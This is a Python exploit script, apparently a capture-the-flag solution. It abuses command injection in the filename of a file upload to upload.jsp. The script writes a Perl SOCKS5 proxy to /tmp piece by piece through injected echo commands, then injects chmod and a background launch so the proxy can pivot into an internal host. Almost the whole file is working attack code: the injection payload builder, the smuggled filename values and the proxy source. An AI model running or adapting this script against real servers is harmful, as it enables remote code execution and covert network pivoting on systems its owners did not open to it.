#!/usr/bin/env python3
import requests
import time
import subprocess

TARGET_URL = "http://localhost:8080"
UPLOAD_URL = f"{TARGET_URL}/upload.jsp"

def create_socks_code():
    """Create minimal SOCKS5 proxy code"""
    return '''#!/usr/bin/perl
use IO::Socket::INET;
$s=IO::Socket::INET->new(LocalHost=>"127.0.0.1",LocalPort=>1080,Proto=>"tcp",Listen=>5,Reuse=>1)or die"$!";
while($c=$s->accept()){
if(fork()==0){
$c->sysread($b,2);
($v,$n)=unpack("CC",$b);
$c->sysread($b,$n);
$c->syswrite(pack("CC",5,0));
$c->sysread($b,4);
($v,$cmd,$r,$a)=unpack("CCCC",$b);
$c->sysread($b,1);
$l=unpack("C",$b);
$c->sysread($b,$l);
$addr=$b;
$c->sysread($b,2);
$port=unpack("n",$b);
$r=IO::Socket::INET->new(PeerHost=>$addr,PeerPort=>$port,Proto=>"tcp")or next;
$c->syswrite(pack("CCCC",5,0,0,1).pack("NN",0,0));
while($c->sysread($d,4096)){
$r->syswrite($d);
}
while($r->sysread($d,4096)){
$c->syswrite($d);
}
exit;
}
$c->close();
}'''

def split_into_chunks(code, max_size=30):
    """Split code into chunks that fit filename limit"""
    chunks = []
    lines = code.split('\n')
    current = ""
    
    for line in lines:
        if len(line) <= max_size:
            if len(current) + len(line) + 1 <= max_size:
                current += line + '\n'
            else:
                if current:
                    chunks.append(current.rstrip())
                current = line + '\n'
        else:
            # Split long line
            if current:
                chunks.append(current.rstrip())
            for i in range(0, len(line), max_size):
                chunks.append(line[i:i+max_size])
            current = ""
    
    if current:
        chunks.append(current.rstrip())
    
    return chunks

def create_payload(chunk, is_first=False):
    """Create command injection payload"""
    if is_first:
        cmd = f"echo '{chunk}' > /tmp/s.pl"
    else:
        cmd = f"echo '{chunk}' >> /tmp/s.pl"
    
    escaped = cmd.replace("'", "'\"'\"'")
    return f"';{escaped};echo '"

def upload_file(filename):
    """Upload file with payload"""
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: text/plain\r
\r
dummy\r
--{boundary}--\r
"""
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    try:
        response = requests.post(UPLOAD_URL, data=body, headers=headers, timeout=5)
        return response.status_code == 200
    except:
        return False

def test_socks5():
    """Test SOCKS5 proxy"""
    try:
        result = subprocess.run([
            'curl', '--socks5', '127.0.0.1:1080', 
            '--connect-timeout', '5',
            'http://internal_web:5000/'
        ], capture_output=True, text=True, timeout=10)
        
        return result.returncode == 0 and "Congratulation" in result.stdout
    except:
        return False

def main():
    print("=== Final SOCKS5 Proxy Exploit ===")
    
    # Create and split code
    code = create_socks_code()
    chunks = split_into_chunks(code, max_size=30)
    
    print(f"Code length: {len(code)} chars")
    print(f"Split into {len(chunks)} chunks")
    
    # Upload chunks
    print("\nUploading chunks...")
    for i, chunk in enumerate(chunks):
        payload = create_payload(chunk, is_first=(i==0))
        
        if len(payload) >= 50:
            print(f"ERROR: Chunk {i+1} too long ({len(payload)} chars)")
            return
        
        if upload_file(payload):
            print(f"Chunk {i+1}/{len(chunks)} uploaded")
        else:
            print(f"Chunk {i+1} failed")
            return
        
        time.sleep(0.2)
    
    # Execute
    print("\nExecuting SOCKS5 proxy...")
    execute_payload = "';chmod +x /tmp/s.pl && /tmp/s.pl &;echo '"
    
    if upload_file(execute_payload):
        print("SOCKS5 proxy started")
    else:
        print("Execution failed")
        return
    
    # Test
    print("\nTesting SOCKS5 proxy...")
    time.sleep(2)
    
    if test_socks5():
        print("SUCCESS! SOCKS5 proxy working!")
        print("Use: curl --socks5 127.0.0.1:1080 http://internal_web:5000/")
    else:
        print("SOCKS5 test failed")

if __name__ == "__main__":
    main()




